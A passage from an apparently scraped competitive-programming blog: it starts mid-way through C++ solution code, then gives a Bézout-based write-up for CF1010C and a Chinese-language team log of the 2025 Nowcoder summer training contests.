for (int i = l;i = r;++i) lst.pop_back (); if (query (lst)) sure = 0; else sure = 1; return true; ; while (1) if (l + 1 == r) if (sure == -1) if (query (l,r)) L = l,R = r; else L = r,R = l; else if (sure == 0) L = l,R = r; else L = r,R = l; break; int mid = (l + r) 1; if (check (l,mid)) r = mid; else l = mid; ans[L] = (;ans[R] = ); vector int p; for (int i = 1;i = n;++i) if (i != L i != R) p.push_back (i); int pos = 0,sz = p.size (); while (pos sz) vector int nw (UP,L); for (int i = 0;i UP;++i) if (pos + i sz) nw[i] = p[pos + i]; vector int lst; for (int i = 0;i UP;++i) for (int j = 0;j dig[i];++j) lst.push_back (L),lst.push_back (nw[i]); lst.push_back (L); int res = query (lst); for (int i = UP - 1;~i;--i) if (nw[i] == L) continue; if (res = (1 + dig[i]) * dig[i] / 2) ans[nw[i]] = ),res -= (1 + dig[i]) * dig[i] / 2; else ans[nw[i]] = (; pos += UP; printf (! ); for (int i = 1;i = n;++i) printf (%c,ans[i]); puts ();fflush (stdout);int main () int t = read (); while (t--) solve (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF1010C Border","path":"/2025/07/27/CF1010C/","content":"形式化一下题意，就是求使得下式成立的 $r$ 的个数。 a_1x_1 + a_2x_2 + \\cdots + a_nx_n = pk + r (x_i,p,r \\ge 0)把 $r$ 看成定值，由裴蜀定理可知上式有解当且仅当 \\gcd(a_1,a_2,\\cdots,a_n) \\mid pk + r裴蜀定理可以推广到 $n$ 个整数的情形: 设 $a_1, a_2, \\cdots, a_n$ 是不全为零的整数，则存在整数$x_1, x_2, \\cdots, x_n$ 使得 $a_1x_1 + a_2x_2 + \\cdots + a_nx_n = \\gcd(a_1, a_2, \\cdots, a_n)$。 其逆定理也成立: 设 $a_1, a_2, \\cdots, a_n$ 是不全为零的整数，$d 0$ 是 $a_1, a_2, \\cdots, a_n$ 的公约数，若存在整数 $x_1, x_2, \\cdots, x_n$ 使 $a_1x_1 + a_2x_2 + \\cdots + a_nx_n = d$，则 $d = \\gcd(a_1, a_2, \\cdots, a_n)$。::: 设 $g = \\gcd(a_1,a_2,\\cdots,a_n)$，则可以改写成 tg = pk + r其中 $g,k,r$ 为定值，因此移项可得 gt - kp = r容易发现这就是 $ax + by = c$ 的变式，有解当且仅当 \\gcd (g,-k) \\mid r因此答案为 $\\{\\gcd(g,-k) \\times 0,\\gcd(g,-k) \\times 1,\\cdots,\\gcd(g,-k) \\times (m - 1)\\}$，其中 $m = \\lfloor\\dfrac{k}{\\gcd(g,-k)}\\rfloor$。注意此处的 $\\gcd$ 均为正数，可以在计算时直接去掉负号。 void solve () int n = read (),k = read (),g = 0; vector int a (n + 1); for (int i = 1;i = n;++i) a[i] = read (),g = __gcd (a[i],g); int tot = k / __gcd (g,k); printf (%d ,tot); for (int i = 0;i tot;++i) printf (%d ,i * __gcd (g,k)); puts ();","categories":["Solution"]},{"title":"2025 牛客暑期多校训练记录","path":"/2025/07/01/Nowcoder25/","content":"目录 2025牛客暑期多校训练营1 2025牛客暑期多校训练营2 2025牛客暑期多校训练营3 2025牛客暑期多校训练营4 2025牛客暑期多校训练营5 2025牛客暑期多校训练营6 2025牛客暑期多校训练营7 2025牛客暑期多校训练营8 2025牛客暑期多校训练营9 2025牛客暑期多校训练营10 后记 2025牛客暑期多校训练营1 【省流版】I 题是正解却被卡常的，H 是比赛结束后 2s 以后过的…… 【Zlw】上来先开始看 E，看到平方差想到化成 $(a+b)(a-b)$ ，但是一开始以为是质数不合法。不过后面细想一下发现分奇偶考虑，$(a+b),(a-b)$ 奇偶性要相同，然后就能得到答案了。 【Scy】G 题题意有点迷惑，看了一遍仍然没懂，于是让 zlw 先开始敲题，趁着他卡住了一下的间隙签到完毕。 【*】前两题在 16/18 min 的时候通过。 【Zlw】接着开了 L。发现满足条件的 $a_i$ 大致是小于中位数。稍微细想可以发现是严格小于 $a_{中位+1}$ 。于是套点数据结构就可以单 $\\log$ 了，不过一开始没想离散树状数组被孙✌怒骂一通，后面想想虽然离散化麻烦总归没有平衡树麻烦。还好写了离散化，据说平衡树被卡常了。 【*】但是 L 爆 int 没有发现浪费了一点时间，1h 多一点 $-1$ 通过 L，之后 zlw 和 sky 看了 K 题，scy 开始 D。D 题应该是想到第一步大与根号的质数幂次为 $1$，但是发现不太会高级筛法，加上看榜提交数量过百但无人通过，于是放弃了这题。大概空机了 15 min，sky 说大致会 K，于是开始写。 【Sky】题目大意就是有一个节点数为 $n$ 的无向图，但每个点的度数最大为 $3$，而且给定了遍历图时的走法，可以理解为固定路线。要求从节点 $i$ 出发能走到的最多边数。 一开始我理解为线路可能是链加环的形式，想了半天怎么做这个记忆化搜索，但经过讨论后发现任何一个线路都一定是环，因为题目给了“所有走廊都是双向的，因此如果从房间 $u$ 到房间 $u$ 有一扇门，那么从房间 $v$ 到房间 $u$ 也有一扇门”，然后就好做很多了，只需要遍历这个固定路线，发现环之后把环上的所有点的这个路线状态都更新答案为环的边的数量即可，然后记忆化，总复杂度 $O(n)$。 这个路线状态可以理解为，点 $u$ 向它的某个节点的边，因为同一个点可能在不同的线路环里，但是一个边一定只被一个环包含。 【*】这道题似乎走弯路走的挺久，写了将近两小时，还 TLE 了一发。Sky 在写这题的时候 Scy 和 Zlw 讨论了一下 H，然后 Scy 独自开了 I 并认为得到了正解，并和 zlw 进行了两次确认。Sky 在写了 1.5 h 的时候遇到问题才进一步和我们讨论，再发现特殊性质以后 20 min 不到通过了这题。感觉这题耗时过久的原因出在前期考虑不充足，然后遇到问题没有即时的讨论。不过好在仍然有多线作战。 【Scy】过了 3 h 的时候开始写 I，差不多 40 min 写完，一个 $O(n^3 \\log n)$ 的区间 dp 加上二分优化。但是提交在 4s 时限的情况下依旧超时，意识到被卡常后和队友交流尝试多次修改，但是无果，折腾了快一个小时仍然没有通过。 【*】 I 这个卡常实在是有点无语（一方面可能牛客的评测机确实有点慢了，第一发提交测了好几分钟才返回 TLE，估计也是靠后的几个点）。赛后随便乱改，删掉了一个 $O(n)$ 的循环反而过了（$n = 420$）。 【Zlw】H 是很快就有人通过的题，但是据说首发是暴力干过去的。 第一眼看没读懂题，孙✌中译中了一下仍然不是很懂，最终花费大量时间看完题目。然后孙✌提出了可以按照连续相等的段，然后计算 $\\sum \\binom{|s|}{2}$ 的方式得到结果。结合奇特的时间复杂度要求想到了 bitset，但是发现要手写，没写过，遂抄板子。 还得把 unsigned long long 分成 $4$ 段处理，看着很复杂，遂没敢写。队友写题的时候想了一下，发现 $1$ 操作可以将差分操作延迟处理，然后处理 $[0,65535]$ 每个数做前缀和之后的结果，以及前后缀 $0$ 个数、中间的对答案的贡献，然后根据上述说的每个 ull 拆成 $4$ 份合并。最后 1h 开写，挂了一点点，查出错再交，又删了一会调试，赛后 2s 过题QAQ。 【*】说实在 I 的卡常确实有点红温了，还时不时地抢了 Zlw 的机位，导致他最后几分钟才开始提交，然后发现错误的时候是 59 分，删完注释提交发现已经 too late 了。 【Scy】看题解的时候才发现 B 是和 H,I 一个难度的，是构造题，我可能会更擅长这一类题目，可以由于赛时通过人数不多，并未发现这道题目。 2025牛客暑期多校训练营2 【省流版】孙老板在第一次赛后复盘时有言：对你们来说目前合适的 timeline 是：$\\texttt{1h}$ $3$ 题，$\\texttt{3h}$ $5$ 题，$\\texttt{5h}$ 保 $6$ 冲 $7$。 于是乎： 在 $4:52$ 时通过 $7$ 题并下班，与预言完美的契合起来！（所以说孙老板说我们能 AK，是不是就能 AK 呢） 【Zlw Sky Scy】Zlw 一开始在看 A，Scy 和 Sky 在讨论 I，但是 Zlw 没怎么读懂 A 题，于是加入了 I 的讨论。I 确实是签到，但（由于 Scy 还在煮水饺吃）稍稍想歪了一点，想要开始大力分类讨论。Sky 一开始考虑变形 $(x-y) \\bmod k = (k \\bmod y) - (k \\bmod x)$，发现 $k=x-y$ 貌似有什么性质。但做了一会之后，Scy 发现直接 $k=1$ 就可以了，快速写，打了个表验证之后就交上去 AC 了。 【Zlw】然后回去看 A，跟 Sky 确认了题意，发现只需要统计 $1$ 的连续段数，被奇特的样例解释卡住了。然后发现是个典型 dp，很快写完。 【Scy Sky】Zlw 在写 A 的时候 Scy 去看了 B。吸取了上一次的教训，等 Zlw 开始上机的时候拉来 Sky 确认了做法。如果能找到 $a_i a_i \\oplus a_j$或者是 $a_j a_i \\oplus a_j$ ，就能满足这个不等式。然后 Sky 发现一种很简单的例子就是 $a_i$ 和 $a_j$ 有着相同的最高位的时候，也就是 $2^k \\leq a_i, a_j 2^{k+1}$ 一定是能满足这个不等式的。Scy 进一步发现这道题非常诈骗，根据鹊巢原理 $n 64$ 的时候都是 No，其余暴力。写完直接交了，结果 WA。。Zlw 在切了 A 之后来看这道题，怒喷 Scy 这个 fw， $a_i \\le 10^{18}$ 还在用位运算模拟（坏了被 $a_i$ 的二进制和 $2^{a_i}$ 搞晕了）。于是 Zlw 提出了不等式 $2^x \\leq 2^x+2^y \\leq 2^{x+1} (x\\geq y)$ 又因为 $x \\oplus y$ 一定是整数，即要么小于等于 $x$，要么大于等于 $x+1$，我们可以这样子把底数 $2$ 直接消掉，进而比较 $x$ 和 $x \\oplus y$ 即可便在 $00:57$ 的时候通过了这题。 【Zlw】然后去看 F。但是看错题了，没看到“只能操作一次”，Scy 读完题发现只能操作一次，然后一起讨论发现直接贪心选择最大的 $0$ 连续段即可。剩下的也可以只用一个 $f$(连续段长度)去表示，不用写特别多的模拟，浪费了很多时间在读题上。 【*】F 写完以后 WA 了一发，原因是 vector 为空的时候没有做保护措施，仍然会有取里面元素的情况。Zlw 写完以后 Scy 大致测了几个额外的样例，但是没有太注意到这种 corner case。 【*】Zlw 写 F 的时候，Scy 去看了计算几何 G，Sky 看了图论 L。 【Zlw Sky】这道题题意比较复杂，但其实就是一个简单的计数问题。一开始没注意到全是环，中间出现了反复横跳的确认。再细读了题目的 Input 保证如果 $i eq j$，则 $a_i eq a_j$，然后题目又说了每个人一定爱着一个人，不管是自己还是别人之后，终于确定了这个关系一定是由几个分开的环组成的（包括自环）。 确定之后就是简单的分环的节点数量的奇偶性讨论就好了，实际上只有两种大情况： 有两个奇数大小的环，那么被禁止结婚的人一定在这两个奇数环里面，这两个对方案数的贡献就是两个环大小直接相乘。 全是偶数大小的环，那么两个被禁止结婚的人一定在同一个环里，分环节点的奇偶位置稍微讨论一下就好了。 对于普通的偶数环，$\\lvert V \\rvert = 2$ 的时候贡献为 $1$，$\\lvert V \\rvert \\geq 4$ 的时候做的贡献为$2$。最后把这几个贡献乘起来就好了。如果出现了不是上面两种情况的，直接输出 $0$。跟 Zlw 确认了一下之后，Zlw 就直接写了，很快A C。 【Scy】 $01:50$ 他俩写完 L，我赶紧找来 Sky 讲了一遍我的做法。分类讨论点在多边形内还是外。在外面答案恒为 $2\\pi$，在内部答案为距离最远点之间的最大角度。Sky 验证了我的做法，于是开写。很快写完后提交，WA。Sky 给我提供了几个 hack 数据，发现写挂了点的地方，改完以后仍然 WA。于是开始红温，后来想到可能是精度的问题，从 acos() 搭配叉乘算角度改为直接用 atan2()，但是又由于忘记变换了参考系，一共 WA 了 $5$ 发，于 $03:47$ 时候通过。 【Sky】Zlw 在写 L 的时候，Scy 找我来做这道计算几何，我当时就有种不好的预感，但这道题确实是下一道该做的了，也没办法。这题的正解实际上就想了不到十分钟，但是因为它是计算几何，加上 $10^9$ 的数据范围，不出意外，被卡精度了。被卡了一个多小时，中间还一度怀疑做法是不是有问题，最后在这个做法上优化了一下精度问题，终于 AC 了。 【*】Scy 在静态调试的时候，Zlw 又和 Sky 讨论出了 H。但是写完提交了几次都是 WA，也在红温的边缘（尤其是 Sky，连续看了两坨）。G 计算几何的通过算是稳定了队内的情绪。 【Zlw】Scy 写 G 的时候我和 Sky 讨论了一下，发现枚举边作为路径上最大的 $w$，然后问题就转换为若干个一次函数在某个位置的最优解。但是这里想的双指针做法假了，一直到最后 40min 才发现。然后 Scy 调出了 G，来一起想，因为没人会改李超树的模板，提出是否可以维护一个上凸包。观察规律尝试了一个形似单调栈的东西维护上凸包过了。 【Sky】在红温 G 的时候，我也来帮 Zlw 想了下 H，他说了下他的做法，但我当时其实只听懂了前半段，后半段有点迷糊没有听懂，就认为 Zlw 这个做法没有任何问题，在思考 G 错在哪的同时，Zlw 上机直接敲了 H。 但问题刚好就出在这个后半段，在处理 $t_j - w_j \\times k_i$ 这个式子的时候，Zlw 的双指针神秘做法其实是有问题的，最后快半个小时的时候突然发现。然后想着这里好像有点像李超线段树，但这道题的通过人数应该用不到这么复杂的数据结构，三个人就同时开始想怎么去解决这个问题。最后两个队友想到了单调栈维护下凸包，Zlw 在高压之下光速写完并一发过，激动人心啊，激动人心。 【*】H 的做法假了一小部分，说明验证正确性这一部分仍然需要改进。好在大家不断地相互鼓励下，提出了凸包的优化，在并不是那么熟悉的情况下在 $04:53$ 极限通过了 H（也算是上一次赛后两秒过题的补偿了吧）！ 2025牛客暑期多校训练营3 【省流版】似乎还是简单场，$7/11$ 题，$\\texttt{rank 181/1610}$。$7 \\to 8$ 题的 gap 似乎挺大的，四小时做完 $7$ 题以后就开始坐牢，最后提前下班。 【*】Zlw 在考 STA2001，所以晚了点来；然后 Sky 要去上暑课，所以提前两小时走了；只有 Scy 全程在吃 【数据删除】。 【Scy】看到了 F 是签到，2 min 一发通过。Zlw 在路上瞅了眼 D，大致确定了一个结论，于是丢给我来实现，在 $00:15$ 通过。 【Sky】J 也是签到题，考虑直接暴力的复杂度很低，大概是 $O(t\\log V)$，但我写太丑了，导致T掉两发（想割手.jpg），想了一下好像有结论，就是先同除以 $\\gcd(a,b)$ 使得互质，然后如果有 $a+b=2^k$，答案就是整数 $k$，否则无解，过题了。 【Scy】在 Sky 红温的时候去看了 A，是一个构造，确实是我的题，于是就开想。想到一个稍微有点奇怪但是好写的构造方法，用 set 在维护。之后又和 Zlw 看了 E，大概确认了他的做法。 【Zlw】等 Sky 红温完毕以后开写，看到这个 $\\div \\times d$ 的形式想到可以看质因数，然后统一每个质数的个数。然后一开始忽略了 $\\times$ 操作，以为是之前的经典结论挑两个不同的数 $-1$ 减到 $0$，犹豫了较长时间才发现可以 $\\times$，于是只跟奇偶性有关了。然后分 $n$ 的奇偶和质数的奇偶讨论。但是筛的时候发现 $O(m \\log m)$ 预处理需要 $2s$ 卡线超时，发现筛的有点丑，想办法优化，然后用线性筛处理出最小质因数然后直接用类似 dp 转移的方式继承上一位出现次数为奇数的质因数。预处理时间降到 1s，但第一次交上去 WA。想了一会儿发现 $n = 2$ 时候需要特判，修改了下后过了。据说题解是 $O(m)$ 的哈希做法。 【Scy】写了一发然后 WA，于是敲了一个 checker 看了半天一直拍不出错，于是重新读题，发现是一行一列的 $\\operatorname{mex}$，而我写的是行列加起来的 $\\operatorname{mex}$。于是复制了一遍我的代码以后再次提交，终于通过。 【Zlw Sky】H 题与 Sky 讨论发现可以维护一个点的最短到达时间，然后直接判断。细想了一会发现可以直接染色标时间戳，这个时候 Scy 在上机，然后细节还挺多的，遂与 Sky 反复确认细节。最后写的是染色 $+$ 倍增使得复杂度为 $O(n \\log n)$，Zlw 强大的码力很快写完一发过。 【Zlw】B 上来想到一个需要 $3\\log$ 的构造，可以把 $b$ 消成 $0$，$a$ 变成 $c$，然后 $b \\rm xor a$，在把 $b$ 变成 $0$ 的过程中用最高位对 $a$ 进行 $\\rm xor$ 操作。但是发现当 $\\max(a,b) c$ 时很难办，乘上去的 $30$ 次操作难以避免，但是联想到 $b$ 消成 $0$ 的”顺路”属性，想到能不能“顺路”改变 $a$ 的更高位。然后又从 $a=0,b=1$ 的情况想到可以 $\\times 2+1$ 的形式凑出更高位，于是将两个想法结合，发现可以平移 $c$ 的较高位与 $a$ 对齐，然后用 $b$ 改造较高位，用 $b=1$ 凑出较低位，发现次数刚好够，测试了一下极限大概在 $63$，于是交题通过。 【Scy】坏了 B 也是构造，但是被 Zlw✌给秒了。难点主要是 $\\max(a,b) c$ 的时候，还在想各种奇怪的方法的时候 Zlw 丢给我一个图，我确认了他的做法，然后他开共享屏幕写，$03:49$ 通过该题。 之后我尝试看 I，是一道纯数学题，先去学了一下置换群才勉强看懂题目。用 OEIS 大致弄出了点结论，猜测是个多项式工程，但是有一些板子并不会写，遂下班。 【Sky】今天比较摆，两位队友过题很快，而且因为后面要上暑课，所以只打了前三个小时😭，逐被带飞。 2025牛客暑期多校训练营4 【省流版】被 Zlw 和 Sky 带飞，Scy 被构造硬控，硬是吃了坨大的。$4/13$ 题，$\\texttt{rank 88/1544}$。 【Scy】这场有难度，上来一下子没有发现很签到的题。过了几分钟看 F 有人过题，遂看题。第一眼是 dp，想了一下发现交换的代价显然是可以撤销的，于是直接按照交换到第一位的代价从大到小排序，然后贪心选即可，$00:19$ 一发通过。 【Zlw】上来先看的 B，一开始过的人比较少，有点不太敢确定做法。简单和 Sky 确认了一下，等 Scy 写完以后我上手写 B，的确就是维护一个“死胡同点“最右边到达的列数即可。 【Scy】发现 D 是一个和线性代数有关的构造，Sky 手玩了一会儿毫无想法，而 Zlw 自然不去碰构造的，于是我开始想题。 【Zlw Sky】 Sky 先看了一会，尝试从多解的结构思考。Zlw 在从 $-1/1$ 转化寻找性质。然后经过 Sky 提醒，发现当两种括号都出现问号时，有很大概率是多解的。从这个角度具体分析，发现如果存在 $\\texttt{)(}$ 必然可以通过交换这两位得到多解。进一步研究交换带来的影响，发现即当满足前缀和在 $[l,r)$ 的最小值 $\\geq 2$ 时，有多解。且去除掉 $\\texttt{)(}$ ，最终必定是形如 $\\texttt{(}\\cdots \\texttt{(()} \\cdots \\texttt{)}$ 的形式。再观察到每个字符的传输正确概率是 $\\frac{1}{2}$，最后概率分母为 $2^{\\lvert s \\rvert}$，然后 Zlw 提出分子可以考虑计数，固定一个左括号，然后去计算右边有哪些右括号可以变成 $\\texttt{?}$。Zlw 佬确认做法之后很快就过题了。 【Scy】纸笔迷题中。一开始考虑的是 $n \\times n$ 的 01 矩阵行列式的最大值。$n = 3$ 行列式为 $2$，一个显然的构造如下： \\begin{bmatrix} 1 & 0 & 1 \\\\ 1 & 1 & 0 \\\\ 0 & 1 & 1 \\end{bmatrix}然后之后进一步尝试，发现 $n = 4,5,6,7$ 时最大为 $3,5,9,32$，其实也就是这个数列。大概找到了构造最大值的方式，但是发现由最大值不太好调整到任意值，于是倒闭。 【Sky Zlw】简化版的推箱子问题，没有小人，箱子可以自己动，所以变得挺简单。因为没有限制箱子对应的目标，所以观察得知，只要一个连通块的箱子数跟目标数相等就一定有解。 Sky 提出箱子可以互相”穿墙“，具体表现为通过”继承“的方式让整体看上去像是穿过去，由此发现窄道并不会影响答案，于是直接判连通块内箱子数等于目标数。（当一个箱子挡住另一个箱子去路时，可以两个都往前走一格，做到一种“穿过”的效果，因为箱子之间没有区别，所以合法）。而且这样子做使得答案特别容易构造，找到一个箱子对应随便一个目标的移动路径（Sky 取了最短路），如果有箱子挡住就对移动路径做一次 reverse 操作，然后直接输出即可，很巧妙。 跟 Zlw 讨论确认算法简单之后我就上机写了，但是大模拟码量比较大，我写了很久，码力这一块还得练。而且因为一个唐问题（bfs 计数同一个连通块内的箱子和目标数居然算重了很多）WA 了几发，导致做了快两个小时。还好这题做出来的人也不多，排名提升了些。 【Scy】还在纸笔迷题中。想来想去还是回到二进制拆分上。基于 $n = 3$ 的构造外加对角矩阵可以使得 $|A^{\\prime}| = |A| \\times 2$，然后再第一行放一个 $1$ 可以实现 $+1$ 的效果。啊，被硬控 4h 终于是想到解法了，但是实现有一定细节，留给我 15 min 去实现。 写完以后没有测直接交，但是 WA。简单修改了一下，再交，已经是 $04:59$，评测队列超级长，等返回 WA 的时候已经结束了。 害，被一道构造硬控了。赛后发现奇偶性有点问题，稍微调整了一下构造就 AC 了。 以后我可以不负责构造了嘛，开点码量题也行（ 【Scyの补题】 L 写成表达式为 $x \\leftarrow \\lceil \\frac{x + a_i}{2} \\rceil$ 后就可以迭代，注意到区间长度大于 $30$ 时由于 $2^{30} 10^9$，因此 $x$ 对答案的影响最多差 $1$。于是不超过 $30$ 暴力计算，超过 $30$ 直接用 $x = 0$ 时候的答案（只需要判断是否有 $1$ 的影响即可）。 A 题算是比较逆天，赛时 $16/55$，感觉榜歪到哪去都不知道了。考虑构造三种类型的数（组） $A,B,C$ 作为基，需要满足 $D(A,B) \\frac{1}{2},D(A,C) \\frac{1}{2},D(B,C) = \\frac{1}{2}$，这样处理每一行的时候以 $A$ 为基准，需要赢的话就用 $B$，输的话用 $C$。 直接去找比较困难，我直接写了暴力去找。通过程序搜索，发现长度至少为 $3$，值域为 $[0,4]$ 时才有解，以下是我用的一组基： 1 1 20 1 30 2 2 最后直接按照这个构造即可： if (i == j) ans[j].push_back (6 * i + 1); ans[j].push_back (6 * i + 1); ans[j].push_back (6 * i + 2);else if (s[i][j] == 1) ans[j].push_back (6 * i + 0); ans[j].push_back (6 * i + 1); ans[j].push_back (6 * i + 3);else ans[j].push_back (6 * i + 0); ans[j].push_back (6 * i + 2); ans[j].push_back (6 * i + 2); 2025牛客暑期多校训练营5 【省流版】 又是坐牢场，$4/13$ 题，$\\texttt{rank 172/1605}$。 【Scy】开局跟榜，I 是签到，分类讨论即可。$n$ 为偶数，直接 $i$ 与 $n - i$ 拼在一行；$n$ 为奇数，$i$ 与 $n - i - 1$ 拼在一行，$n$ 单独成一行。因此答案为 $3n + 1 + [n \\bmod 2 = 1]$。 【Scy】 看了 D 构造，打个表找规律，但是没有发现什么有价值的地方。这时候 Zlw 让我来看看 E，读完题以后提出可以按位来算贡献，然后想到了个 DP。由于空机时间比较久了，就没有进一步确认直接开写，他俩去看了别的题目。 设 $f_{i,0/1,0/1}$ 表示考虑二进制下从低往高的第 $i$ 位为 $0/1$ 时，之前位置上 $1$ 出现了偶数/奇数次的数的个数。由于异或，显然第 $i$ 位上的数要奇偶不同，又由于只有从低到高的第奇数个 $1$ 才能有贡献，因此 $f_{i,0,1},f_{i,1,1}$ 与 $f_{i,0,0},f_{i,1,0}$ 这两对数会产生贡献。 for (int j = 1;j = n;++j) ++f[a[j] i 1][st[j]]; st[j] ^= a[j] i 1;ans += 1ll * (1ll i) * (f[0][0] * f[1][0] + f[1][1] * f[0][1]); 由于没有确认过做法，在交之前花 5 min 写了个暴力对拍。幸好没有拍出错，提交一遍 AC。 【Sky Zlw】 E 没思路，Scy 写完签到过来秒了，遂与 Sky 讨论 J。题目大意如下： 给定一个 $\\texttt{01}$ 网格，$\\texttt{1}$ 每秒向上下左右染色，可以给一个 $\\texttt{0}$ 变成 $\\texttt{1}$，使得总染色时间最小。 Sky 一开始的想法是取最远点的“中心”，就是找到一个点，距离所有点曼哈顿距离最大值最小。具体来说，先不管这个变成 $\\texttt{1}$ 的格子，考虑直接 bfs 模拟一遍染色过程，标出所有格子的最短时间，然后去思考怎么将最大时间那几个格子早点染色。考虑直接取几个最大时间格子的曼哈顿距离中心，即找出一个格子，使得其到几个最大时间格子的曼哈顿距离的最大值最小。即： (x,y) = \\arg \\min_{(x, y) \\in I} (\\max_{i \\in M} (\\lvert x-x_i \\rvert + \\lvert y-y_i \\rvert))其中，$I$ 是坐标范围，$M$ 是最大时间格子的编号集合。 但这样不太好证明正确性，且求取中心需要分 $4$ 个象限分类讨论异常麻烦。而且直接这样做的复杂度是 $O((nm)^2)$，不理想。Zlw 提出可以二分距离，保证正确性，但 Sky 认为太复杂，于是先尝试如何避免分类讨论或者更复杂的操作。然后发现可以镜像翻转把 $4$ 个象限统一到左上角求取。这个时候 Scy 已经写完题，处于空机状态，遂优先正确性写了二分，由于没特判全 $0$ 和数组清空不全 WA 了两发。赛后看群里发现这个 case 也有很多的队伍被卡（会显示用例通过率 $98.78\\%$）。 【Scy】A 题看了很久，尝试推了一下式子。$s - t = \\sum (k - 2p_i)$，其中 $p_i$ 表示每次选择朝上的硬币的个数。显然 $s - t$ 是奇数且 $k$ 是偶数时无解。又需要满足每次 $p_i \\in [s^\\prime + k - n,s^\\prime]$，其中 $s^\\prime$ 为当前朝上硬币的个数。还发现 $n = k$ 时是特殊的，只有 $s + t = n$ 时答案为 $1$，否则无解。但是接下去一直不知道如何处理每次 $p_i$ 的取值，看数据范围很像是结论题，但是找不到规律，没法进一步推进。（坐牢中） 【Zlw】 K 朴素 dp 是 $O(k2^m)$ ，然后尝试了从树形结构出发树形 dp，但仍然非常复杂不确定正确性，且时间复杂度约为 $O(m^2 2^m)$ 不太能够通过。继续观察发现本质不同的链数只有 $O(m^2)$ ，有了一个好写的 $O(m^2 2^m)$ 的写法，因为空机遂写了一下，不负众望的 TLE 了。 【Scy】在 Zlw 的 $O(m^2 2^m)$ 的基础上，我想到可以利用 fwt 和容斥来计算答案，时间复杂度可以优化到 $O(m 2^m)$。这时候需要算组合数，这恰好和题目里的数字在模 $998244353$ 上非 $0$ 对应了起来。Zlw 佬的代码和我的代码不太能兼容，于是直接重写。 直接选择利用 dfs 树的性质来求出一条路径是否经过第 $i$ 条关键边（这里需要注意是用深度大的结点去判断！！当时这里还调试了很久），然后直接放到状态里，进行 sosdp，得到 $g_S$，表示状态为 $S$ 的子集的路径条数。然后枚举答案，尝试用 $i$ 条边去覆盖这 $m$ 个关键点。用容斥就能算出答案，即 $tot = \\sum \\limits _{i = 0}^{2^m - 1} (-1) ^ {[(m - \\operatorname{popcount}(i)) \\bmod 2 = 1]} \\times \\binom {g_i}{i}$。找到第一个使 $tot$ 非零的 $i$ 就可以直接输出，否则无解。紧赶慢赶终于在 $04:45$ 的时候通过。 【Scy】最终 $4$ 题遗憾离场了。不过好像排名还行，还是上分了！ 【Sky】今天这场很史，我也很摸，被队友带飞😭。 2025牛客暑期多校训练营6 【省流版】开局签不上到，榜歪得很，导致最后没来得及过 $B$。$5/13$ 题，$\\texttt{rank 156/1437}$。 【Scy】开局看 C，$f(p)$ 是好求的，就是第一类斯特林数，但是三次方没想法，打了表也没发现什么规律。但这时候 Zlw 的 K 有了想法，于是先让他来写。 【Zlw】其实一开始看的就是 M 这道题，并且很快的跟 Sky 讨论出正解。但是并没有严格的证明正确性且当时没人过，于是看其它签到题去了。$n$ 为奇数时容易构造，为偶数时需要找到最相近的两个数填到最高位，剩下的构造方案固定。理论上只要找到最优的最高位即可。当时发现可以找到最靠近中心的最优最高位，然后直接确定或者进行一次 $O(n)$ 的比较。但是经过一系列莫名奇妙的操作和严重歪掉的榜，我们忘记了这道题。 【Zlw】K 看到整体加再取 $\\gcd$，想到经典差分，变成了取前后缀原数组以及中间差分数组的 $\\gcd$。 然后又想到经典前/后缀 $\\gcd$ 变换次数为 $O(\\log)$ ，于是暴力枚举前后缀不同值，贪心选取使中间区间最小的情况，再配一个st表查询即可。这部分复杂度 $O(\\log^2 w)$ 完全可以接受。 【Scy Sky】Scy 和 Sky 找规律，提出了一个 $f_{i+1,j}=f_{i,j}\\times i+f_{i,j-1}$，然后 Zlw 设 $f_i$ 的 $\\rm OGF$ 为$F_{i}$，$F_{i+1}=xF_{i}+iF_i=(x+i)F_{i}$，发现$F_n=\\prod_{i=1}^{n-1}(x+i)$，于是鼓励 Scy 用分治+ FFT 但并未被采纳（想🍑）。 【Zlw Sky】L 题的题目大意是给定 $m$ 个区间，求长为 $2n$ 的字典序最小的合法括号串，满足每个区间内至少有一个左括号。若无解，则输出 $-1$。 考虑没有约束的话，字典序最小就是 $\\texttt{(((…)))}$ 这样的形式，然后先把有包含的区间删掉大的，再根据区间从右往左贪心，把每个区间最左边的右括号换成左括号。 构造/贪心题 Zlw 不太擅长，但是 Scy 在写忙，场上此时看起来也只有这题可做。在 Sky 的帮助下慢慢确定了交换最右侧左括号的策略。但是细节比较多，写挂了，WA 了好几次。这个时候有点红温，大概能确定是 WA 在交换括号的细节上了。后面想了想，可以先贪心的填必填的左括号，再补全剩下的就可以。重构了一下过了。 【Scy】我按照 Zlw 给的多项式的想法，就是 $f(x) = x(x + 1)\\cdots(x + n)$ 的系数就是具体的答案，然后按照这个式子出发，$F(x) = x \\times (x^k)^\\prime = kx^k$，因此 $F^3(x)$ 可以把 $k^3$ 的系数搞出来。之后经过一系列复杂的求导之后，大概过了 2h 才通过此题。 *赛后看题解以后的做法： 设 $I_i$ 表示元素 $i$ 是否在栈内，也就是 I_i = \\begin{cases} 1 & \\text{if } i \\text{ is in the stack}, \\\\ 0 & \\text{otherwise}. \\end{cases}把立方看成选三个项相乘，于是有 f^3(p) = \\sum\\limits_{i} I^3_i + 3\\sum\\limits_{i eq j} I^2_iI_j + 6\\sum\\limits_{i < j < k}I_iI_jI_k \\\\ = \\sum\\limits_{i} I_i + 6\\sum\\limits_{i < j} I_iI_j + 6\\sum\\limits_{i < j < k}I_iI_jI_k考虑单个元素 $i$ 在栈中，则 $1 \\sim i - 1$ 需要在 $i$ 前面，共 $(i - 1)!$ 种，而 $i + 1 \\sim n$ 随意放置，共 $\\frac{n!}{i!}$ 种，因此共有 $\\frac{n!}{i}$ 种。同理得到双元素和三元素的方案数为 $\\frac{n!}{ij}$ 与 $\\frac{n!}{ijk}$。预处理式子即可 $O(1)$ 求出。 【Scy】D 注意到单组数据，然后看 $455$ 只有 $\\binom {15}{3}$ 或 $\\binom{15}{12}$ 能凑出来，所以往组合数上靠。转换了一下题意，对于某一行，填的数单调不降；对于某一列，填的数单调不增。然后一下子没什么想法，于是开始尝试凑式子，凑了 $\\dbinom {(n + 1)m}{m}$，发现大样例过不了。又想到可以 $\\dbinom{n(n - 1) + m}{m}$，然后惊喜地发现对了，于是果断提交过题！ 